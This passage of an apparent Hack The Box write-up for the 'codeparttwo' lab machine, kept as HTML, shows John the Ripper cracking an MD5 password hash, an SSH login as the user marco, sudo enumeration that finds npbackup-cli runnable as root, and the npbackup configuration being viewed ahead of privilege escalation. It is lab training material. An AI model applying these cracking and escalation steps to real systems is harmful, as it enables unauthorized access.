+2025-10-16 01:29:59 (42.0 KB/s) - ‘users.db’ saved [16384/16384]
+</pre> </div> </div> <p><br> Use john the ripper to try crack the passwords.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4618"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4618')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4618')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4618')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4618')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4618">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sweetangelbabylove (marco)     
+1g 0:00:00:01 DONE (2025-10-17 01:32) 0.9803g/s 14062Kp/s 14062Kc/s 17443KC/s  fuckyooh21..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4618" onclick="terminalOverlayClose('bash-bash-4618')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4618')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4618')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4618')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4618" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sweetangelbabylove (marco)     
+1g 0:00:00:01 DONE (2025-10-17 01:32) 0.9803g/s 14062Kp/s 14062Kc/s 17443KC/s  fuckyooh21..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+</pre> </div> </div> <p><br> Ssh into the machine as marco.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41698"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41698')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41698')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41698')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41698')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41698">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ ssh marco@10.129.1.238                   
+The authenticity of host '10.129.1.238 (10.129.1.238)' can't be established.
+ED25519 key fingerprint is: SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:1: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.1.238' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+marco@10.129.1.238's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri 16 Jan 2026 11:23:05 AM UTC
+
+  System load:           0.01
+  Usage of /:            57.4% of 5.08GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             223
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.1.238
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99f
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Jan 16 11:23:07 2026 from 10.10.14.120
+marco@codeparttwo:~$
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41698" onclick="terminalOverlayClose('bash-bash-41698')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41698')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41698')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41698')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41698" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
+└─$ ssh marco@10.129.1.238                   
+The authenticity of host '10.129.1.238 (10.129.1.238)' can't be established.
+ED25519 key fingerprint is: SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:1: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.1.238' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+marco@10.129.1.238's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri 16 Jan 2026 11:23:05 AM UTC
+
+  System load:           0.01
+  Usage of /:            57.4% of 5.08GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             223
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.1.238
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99f
+
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Jan 16 11:23:07 2026 from 10.10.14.120
+marco@codeparttwo:~$
+</pre> </div> </div> <p><br> Run sudo <code class="language-plaintext highlighter-rouge">-l</code> to see the command the user can run as sudo.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4313"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4313')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4313')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4313')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4313')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4313">
+marco@codeparttwo:~$ sudo -l
+Matching Defaults entries for marco on codeparttwo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codeparttwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4313" onclick="terminalOverlayClose('bash-bash-4313')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4313')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4313')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4313')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4313" data-language="bash">
+marco@codeparttwo:~$ sudo -l
+Matching Defaults entries for marco on codeparttwo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User marco may run the following commands on codeparttwo:
+    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
+</pre> </div> </div> <p><br> Run the command in the sudo list to see what it does.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4385"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4385')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4385')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4385')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4385')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4385">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli
+2026-01-16 11:25:32,344 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 11:25:32,344 :: CRITICAL :: Cannot run without configuration file.
+2026-01-16 11:25:32,350 :: INFO :: ExecTime = 0:00:00.009767, finished, state is: critical.
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4385" onclick="terminalOverlayClose('bash-bash-4385')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4385')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4385')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4385')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4385" data-language="bash">
+marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli
+2026-01-16 11:25:32,344 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
+2026-01-16 11:25:32,344 :: CRITICAL :: Cannot run without configuration file.
+2026-01-16 11:25:32,350 :: INFO :: ExecTime = 0:00:00.009767, finished, state is: critical.
+</pre> </div> </div> <p><br> Get the user.txt flag.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4870"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4870')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4870')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4870')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4870')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4870">
+marco@codeparttwo:~$ cat user.txt 
+&lt;redacted&gt;
+marco@codeparttwo:~$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b0:a9:9f brd ff:ff:ff:ff:ff:ff
+    inet 10.129.1.238/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 3267sec preferred_lft 3267sec
+    inet6 dead:beef::250:56ff:feb0:a99f/64 scope global dynamic mngtmpaddr 
+       valid_lft 86396sec preferred_lft 14396sec
+    inet6 fe80::250:56ff:feb0:a99f/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4870" onclick="terminalOverlayClose('bash-bash-4870')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4870')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4870')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4870')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4870" data-language="bash">
+marco@codeparttwo:~$ cat user.txt 
+&lt;redacted&gt;
+marco@codeparttwo:~$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:b0:a9:9f brd ff:ff:ff:ff:ff:ff
+    inet 10.129.1.238/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 3267sec preferred_lft 3267sec
+    inet6 dead:beef::250:56ff:feb0:a99f/64 scope global dynamic mngtmpaddr 
+       valid_lft 86396sec preferred_lft 14396sec
+    inet6 fe80::250:56ff:feb0:a99f/64 scope link 
+       valid_lft forever preferred_lft forever
+</pre> </div> </div> <p><br> Run ls to try and find the config file that the error specifies.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4881"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4881')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4881')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4881')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4881')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4881">
+marco@codeparttwo:~$ ls -la
+total 44
+drwxr-x--- 6 marco marco 4096 Jan 16 11:15 .
+drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
+drwx------ 7 root  root  4096 Apr  6  2025 backups
+lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
+drwx------ 2 marco marco 4096 Apr  6  2025 .cache
+drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
+lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -&gt; /dev/null
+-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
+-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -&gt; /dev/null
+lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -&gt; /dev/null
+drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
+-rw-r----- 1 root  marco   33 Jan 16 10:59 user.txt
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4881" onclick="terminalOverlayClose('bash-bash-4881')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4881')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4881')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4881')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4881" data-language="bash">
+marco@codeparttwo:~$ ls -la
+total 44
+drwxr-x--- 6 marco marco 4096 Jan 16 11:15 .
+drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
+drwx------ 7 root  root  4096 Apr  6  2025 backups
+lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
+drwx------ 2 marco marco 4096 Apr  6  2025 .cache
+drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
+lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -&gt; /dev/null
+-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
+-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -&gt; /dev/null
+lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -&gt; /dev/null
+drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
+-rw-r----- 1 root  marco   33 Jan 16 10:59 user.txt
+</pre> </div> </div> <p><br> Make a copy of the file just in case we make mistakes we can revert.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-458"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-458')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-458')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-458')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-458')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-458">
+marco@codeparttwo:~$ cp npbackup.conf npbackup.conf.orig
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-458" onclick="terminalOverlayClose('bash-bash-458')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-458')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-458')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-458')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-458" data-language="bash">
+marco@codeparttwo:~$ cp npbackup.conf npbackup.conf.orig
+</pre> </div> </div> <p><br> View the config file.</p> <div class="codebox"> <div class="codebox__header"> <span class="codebox__title">npbackup.conf</span> </div> <pre class="codebox__body">
+conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /home/app/app/
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+groups:
+  default_group:
+    backup_opts:
+      paths: []
+      source_type:
+      stdin_from_command:
+      stdin_filename:
+      tags: []
+      compression: auto
+      use_fs_snapshot: true
+      ignore_cloud_files: true
+      one_file_system: false
+      priority: low
+      exclude_caches: true
+      excludes_case_ignore: false
+      exclude_files:
+      - excludes/generic_excluded_extensions
+      - excludes/generic_excludes
+      - excludes/windows_excludes
+      - excludes/linux_excludes
+      exclude_patterns: []
+      exclude_files_larger_than:
+      additional_parameters:
+      additional_backup_only_parameters:
+      minimum_backup_size_error: 10 MiB
+      pre_exec_commands: []
+      pre_exec_per_command_timeout: 3600
+      pre_exec_failure_is_fatal: false
+      post_exec_commands: []
+      post_exec_per_command_timeout: 3600
+      post_exec_failure_is_fatal: false
+      post_exec_execute_even_on_backup_error: true
+      post_backup_housekeeping_percent_chance: 0
+      post_backup_housekeeping_interval: 0
+    repo_opts:
+      repo_password:
+      repo_password_command:
+      minimum_backup_age: 1440
+      upload_speed: 800 Mib
+      download_speed: 0 Mib
+      backend_connections: 0
+      retention_policy:
+        last: 3
+        hourly: 72
+        daily: 30
+        weekly: 4
+        monthly: 12
+        yearly: 3
+        tags: []
+        keep_within: true
+        group_by_host: true
+        group_by_tags: true
+        group_by_paths: false
+        ntp_server:
+      prune_max_unused: 0 B
+      prune_max_repack_size:
+    prometheus:
+      backup_job: ${MACHINE_ID}
+      group: ${MACHINE_GROUP}
+    env:
+      env_variables: {}
+      encrypted_env_variables: {}
+    is_protected: false
+identity:
+  machine_id: ${HOSTNAME}__blw0
+  machine_group:
+global_prometheus:
+  metrics: false
+  instance: ${MACHINE_ID}
+  destination:
+  http_username:
+  http_password:
+  additional_labels: {}
+  no_cert_verify: false
+global_options:
+  auto_upgrade: false
+  auto_upgrade_percent_chance: 5
+  auto_upgrade_interval: 15
+  auto_upgrade_server_url:
+  auto_upgrade_server_username:
+  auto_upgrade_server_password:
+  auto_upgrade_host_identity: ${MACHINE_ID}
+  auto_upgrade_group: ${MACHINE_GROUP}
